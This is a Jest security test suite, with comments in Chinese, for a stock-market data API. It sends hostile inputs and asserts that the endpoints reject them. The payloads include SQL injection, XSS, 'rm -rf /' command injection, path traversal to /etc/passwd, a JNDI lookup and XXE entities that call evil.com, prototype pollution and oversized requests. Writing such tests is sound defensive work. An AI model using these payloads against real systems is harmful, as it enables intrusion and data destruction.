/**
 * 核心数据安全测试
 * 测试数据接收、转换、查询模块的安全漏洞
 */

describe('Core Data Security Tests', () => {
  let request: any;
  let validApiKey: any;

  beforeAll(async () => {
    request = global.createSecurityRequest();
    
    // 创建测试用的API Key
    validApiKey = await global.createTestApiKey({
      permissions: ['data:read', 'query:execute'],
    });
  });

  describe('Data Receiver Security', () => {
    it('应该防护股票符号注入攻击', async () => {
      const maliciousSymbols = [
        'AAPL"; DROP TABLE symbols; --',
        'AAPL\\x00\\x01\\x02',
        'AAPL\r\nHost: evil.com',
        '<script>alert("XSS")</script>',
        '${java.lang.Runtime.exec("rm -rf /")}',
        '#{7*7}', // Expression Language injection
        '{{7*7}}', // Template injection
        '%{7*7}', // OGNL injection
      ];

      for (const symbol of maliciousSymbols) {
        const response = await request
          .post('/api/v1/receiver/data')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .send({
            symbols: [symbol],
            dataType: 'stock-quote',
          });

        // 应该返回错误或安全地处理，不应该执行恶意代码
        expect([400, 422, 500]).toContain(response.status);
        
        // 检查响应不包含恶意代码执行结果
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('DROP'); // SQL注入不应执行
        expect(responseText).not.toContain('<script>'); // XSS不应执行
        expect(responseText).not.toContain('alert('); // JavaScript执行不应出现
        // 验证系统返回安全的错误消息（不回显恶意输入是好的安全实践）
        expect(response.body.message).toMatch(/(格式不正确|验证失败|不安全的内容)/i);
      }
    });

    it('应该限制批量请求数量防止DoS攻击', async () => {
      const massiveSymbolList = Array.from({ length: 10000 }, (_, i) => `SYMBOL${i}.HK`);
      
      const response = await request
        .post('/api/v1/receiver/data')
        .set('X-App-Key', validApiKey.appKey)
        .set('X-Access-Token', validApiKey.accessToken)
        .send({
          symbols: massiveSymbolList,
          dataType: 'stock-quote',
        });

      // 应该拒绝或限制大批量请求
      expect([400, 413, 429]).toContain(response.status);
    });

    it('应该验证dataType参数防止路径遍历', async () => {
      const maliciousDataTypes = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        'file:///etc/passwd',
        'data:text/plain;base64,dGVzdA==',
        'stock-quote; cat /etc/passwd',
        'stock-quote\x00admin',
      ];

      for (const dataType of maliciousDataTypes) {
        const response = await request
          .post('/api/v1/receiver/data')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .send({
            symbols: ['AAPL.US'],
            dataType: dataType,
          });

        // 应该拒绝路径遍历攻击
        expect(response.status).toBe(400);
        
        // 检查错误消息是否恰当处理了恶意输入
        const responseText = JSON.stringify(response.body);
        // 业务错误消息可以显示用户输入（帮助用户理解错误），但不应包含实际文件系统内容
        // 检查不包含实际文件系统访问的结果（文件内容、目录列表等）
        expect(responseText).not.toContain('root:x:'); // 不应包含passwd文件内容  
        expect(responseText).not.toContain('bin/bash'); // 不应包含系统用户信息
        expect(responseText).not.toContain('drwxr-xr-x'); // 不应包含目录权限信息
        expect(responseText).not.toMatch(/\/home\/\w+/); // 不应包含真实用户目录结构
        expect(responseText).not.toContain('Permission denied'); // 不应包含文件系统访问错误
        // 验证错误消息正确处理（系统可能返回通用安全错误而非具体业务错误）
        expect(response.body.message).toMatch(/(不支持的数据类型|不安全的内容|验证失败)/i);
      }
    });

    it('应该防护JSON反序列化攻击', async () => {
      const maliciousPayloads: any[] = [
        {
          symbols: ['AAPL.US'],
          dataType: 'stock-quote',
          __proto__: { admin: true },
        },
        {
          symbols: ['AAPL.US'],
          dataType: 'stock-quote',
          constructor: { prototype: { admin: true } },
        },
      ];

      for (const payload of maliciousPayloads) {
        const response = await request
          .post('/api/v1/receiver/data')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .send(payload);

        // 应该安全处理而不受原型污染影响
        // 注意：这些请求在结构上是有效的，系统会忽略原型污染尝试
        expect([200, 400, 422, 500]).toContain(response.status);
        
        // 如果请求成功，验证响应中没有被污染的属性
        if (response.status === 200) {
          expect(response.body.admin).toBeUndefined();
        }
      }
    });
  });

  describe('Data Transformer Security', () => {
    it('应该防护映射规则注入攻击', async () => {
      const maliciousRules: any[] = [
        {
          provider: 'test',
          dataType: 'stock-quote',
          rawData: {
            // 尝试代码注入
            maliciousCode: 'require("child_process").exec("rm -rf /")',
          },
        },
        {
          provider: 'test',
          dataType: 'stock-quote',
          rawData: {
            // 尝试原型污染
            '__proto__': { admin: true },
            'constructor': { prototype: { admin: true } },
          },
        },
      ];

      for (const rule of maliciousRules) {
        const response = await request
          .post('/api/v1/transformer/transform')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .send(rule);

        // 应该拒绝恶意规则或认证失败（包含403禁止访问）
        expect([400, 401, 403, 422, 500]).toContain(response.status);
      }
    });

    it('应该限制数据大小防止内存耗尽', async () => {
      const largeData = {
        provider: 'test',
        dataType: 'stock-quote',
        rawData: {
          // 创建大量数据
          data: Array.from({ length: 100000 }, (_, i) => ({
            symbol: `SYMBOL${i}`,
            price: Math.random() * 1000,
            volume: Math.random() * 1000000,
            metadata: 'A'.repeat(10000), // 每个条目包含大量数据
          })),
        },
      };

      const response = await request
        .post('/api/v1/transformer/transform')
        .set('X-App-Key', validApiKey.appKey)
        .set('X-Access-Token', validApiKey.accessToken)
        .send(largeData);

      // 应该拒绝过大的数据
      expect([413, 400]).toContain(response.status);
    });

    it('应该防护嵌套对象炸弹攻击', async () => {
      // 创建深度嵌套的对象（适度深度避免测试环境栈溢出）
      let nestedObject: any = { value: 'test' };
      for (let i = 0; i < 100; i++) {
        nestedObject = { nested: nestedObject };
      }

      try {
        const response = await request
          .post('/api/v1/transformer/transform')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .send({
            provider: 'test',
            dataType: 'stock-quote',
            rawData: nestedObject,
          });

        // 应该拒绝过度嵌套的数据
        expect([413, 400, 401]).toContain(response.status);
      } catch (error) {
        // 如果因为嵌套过深导致请求失败，也算测试通过
        expect(error.message).toMatch(/(timeout|stack|nested|deep)/i);
      }
    });
  });

  describe('Query Interface Security', () => {
    it('应该防护查询注入攻击', async () => {
      const maliciousQueries = [
        {
          queryType: 'by_symbols',
          symbols: ['AAPL"; DELETE FROM stocks WHERE 1=1; --'],
        },
        {
          queryType: 'by_symbols',
          symbols: ['AAPL'],
          filters: {
            '$where': 'function() { return true; }',
          },
        },
        {
          queryType: 'by_symbols',
          symbols: ['AAPL'],
          sort: {
            field: 'price; DROP TABLE stocks; --',
          },
        },
      ];

      for (const query of maliciousQueries) {
        const response = await request
          .post('/api/v1/query/execute')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .send(query);

        expect([400, 422]).toContain(response.status);
        
        // 检查不泄露数据库错误信息
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('DELETE');
        expect(responseText).not.toContain('DROP');
        expect(responseText).not.toContain('SQL');
        expect(responseText).not.toContain('MongoDB');
      }
    });

    it('应该限制查询结果数量防止数据泄露', async () => {
      const response = await request
        .post('/api/v1/query/execute')
        .set('X-App-Key', validApiKey.appKey)
        .set('X-Access-Token', validApiKey.accessToken)
        .send({
          queryType: 'by_symbols',
          symbols: Array.from({ length: 10000 }, (_, i) => `SYMBOL${i}.HK`),
          limit: 1000000, // 尝试获取大量数据
        });

      // 应该限制返回的数据量
      if (response.status === 200 && response.body.data) {
        expect(response.body.data.length).toBeLessThanOrEqual(1000);
      } else {
        expect([400, 413]).toContain(response.status);
      }
    });

    it('应该验证查询参数防止路径遍历', async () => {
      const maliciousParams = [
        '../../../admin/users',
        '../../etc/passwd',
        'file:///etc/passwd',
        'admin/../../../root',
      ];

      for (const param of maliciousParams) {
        const response = await request
          .post('/api/v1/query/execute')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .send({
            queryType: param,
            symbols: ['AAPL.US'],
          });

        expect(response.status).toBe(400);
      }
    });
  });

  describe('Symbol Mapper Security', () => {
    it('应该防护符号映射规则注入', async () => {
      const maliciousRules = [
        {
          inputSymbol: 'AAPL"; DELETE FROM symbol_mappings; --',
          outputSymbol: 'AAPL.US',
          market: 'US',
        },
        {
          inputSymbol: 'AAPL',
          outputSymbol: 'AAPL.US',
          market: '${jndi:ldap://evil.com/a}', // JNDI injection
        },
        {
          inputSymbol: '<script>alert("XSS")</script>',
          outputSymbol: 'AAPL.US',
          market: 'US',
        },
      ];

      for (const rule of maliciousRules) {
        const response = await request
          .post('/api/v1/symbol-mapper/transform')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .send({
            provider: 'test',
            symbols: [rule.inputSymbol],
          });

        // 应该安全处理恶意符号
        expect([400, 422, 500]).toContain(response.status);
        
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('DELETE');
        expect(responseText).not.toContain('<script>');
        expect(responseText).not.toContain('jndi:');
      }
    });

    it('应该限制批量映射请求防止DoS', async () => {
      const massiveSymbols = Array.from({ length: 50000 }, (_, i) => `SYMBOL${i}`);
      
      const response = await request
        .post('/api/v1/symbol-mapper/transform')
        .set('X-App-Key', validApiKey.appKey)
        .set('X-Access-Token', validApiKey.accessToken)
        .send({
          provider: 'test',
          symbols: massiveSymbols,
        });

      // 应该限制批量请求
      expect([413, 429, 400]).toContain(response.status);
    });
  });

  describe('Data Validation Security', () => {
    it('应该防护恶意文件上传', async () => {
      // 模拟尝试上传恶意文件类型
      const maliciousFiles = [
        'data:application/javascript;base64,YWxlcnQoIlhTUyIp', // alert("XSS")
        'data:text/html,<script>alert("XSS")</script>',
        'data:application/zip,PK...',
      ];

      for (const file of maliciousFiles) {
        const response = await request
          .post('/api/v1/receiver/data')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .send({
            symbols: ['AAPL.US'],
            dataType: 'stock-quote',
            attachment: file,
          });

        // 应该拒绝恶意文件
        expect([400, 415]).toContain(response.status);
      }
    });

    it('应该防护XML外部实体攻击', async () => {
      const xmlPayloads = [
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
        '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://evil.com/evil.dtd">]><root>&test;</root>',
      ];

      for (const xml of xmlPayloads) {
        const response = await request
          .post('/api/v1/receiver/data')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .set('Content-Type', 'application/xml')
          .send(xml);

        // 应该拒绝或安全处理XML
        expect([400, 415]).toContain(response.status);
        
        const responseText = JSON.stringify(response.body);
        expect(responseText).not.toContain('root:');
        expect(responseText).not.toContain('/etc/passwd');
      }
    });
  });

  describe('Business Logic Security', () => {
    it('应该防护竞态条件攻击', async () => {
      // 减少并发请求数量避免连接问题，使用有效的港股代码格式
      const concurrentRequests = Array(10).fill(0).map(async (_, index) => {
        try {
          // 添加小延迟避免瞬间大量连接
          await new Promise(resolve => setTimeout(resolve, index * 10));
          
          return await request
            .post('/api/v1/receiver/data')
            .set('X-App-Key', validApiKey.appKey)
            .set('X-Access-Token', validApiKey.accessToken)
            .timeout(10000) // 增加超时时间
            .send({
              symbols: ['00700.HK'], // 使用有效的港股代码格式
              dataType: 'stock-quote',
            });
        } catch (error) {
          // 返回错误信息而不是抛出异常
          return {
            status: error.status || 500,
            body: { error: error.message },
            error: true,
          };
        }
      });

      const responses = await Promise.allSettled(concurrentRequests);
      const actualResponses = responses
        .filter(r => r.status === 'fulfilled')
        .map(r => r.value)
        .filter(r => r); // 过滤掉空值
      
      // 应该正确处理并发请求，不应该出现数据不一致
      const successfulResponses = actualResponses.filter(r => r.status === 200);
      const errorResponses = actualResponses.filter(r => r.status !== 200);
      
      // 至少应该有一些成功的响应
      expect(successfulResponses.length).toBeGreaterThan(0);
      
      // 检查没有内部错误（允许网络错误和业务错误）
      errorResponses.forEach(response => {
        if (response.status === 500 && !response.error) {
          // 只有非网络错误的500才算失败
          expect(response.status).not.toBe(500);
        }
      });
    });

    it('应该防护时间基础攻击', async () => {
      const startTime = Date.now();
      
      // 尝试一个不存在的符号
      await request
        .post('/api/v1/receiver/data')
        .set('X-App-Key', validApiKey.appKey)
        .set('X-Access-Token', validApiKey.accessToken)
        .send({
          symbols: ['NONEXISTENT_SYMBOL.HK'],
          dataType: 'stock-quote',
        });

      const endTime = Date.now();
      const responseTime = endTime - startTime;
      
      // 响应时间不应该过长（可能表明暴力破解尝试）
      expect(responseTime).toBeLessThan(10000); // 10秒
    });

    it('应该防护资源枯竭攻击', async () => {
      // 创建多个大量符号的请求（使用有效格式但超出限制）
      const longRunningRequests = Array(5).fill(0).map(async () => {
        const response = await request
          .post('/api/v1/receiver/data')
          .set('X-App-Key', validApiKey.appKey)
          .set('X-Access-Token', validApiKey.accessToken)
          .send({
            symbols: Array.from({ length: 150 }, (_, i) => `${String(i).padStart(6, '0')}.HK`), // 超出100个限制
            dataType: 'stock-quote',
          });
        
        return response;
      });

      const responses = await Promise.all(longRunningRequests);
      
      // 系统应该能够处理多个大请求而不崩溃
      responses.forEach(response => {
        expect([200, 400, 413, 429, 503]).toContain(response.status);
        expect(response.status).not.toBe(500); // 不应该内部错误
      });
    });
  });
});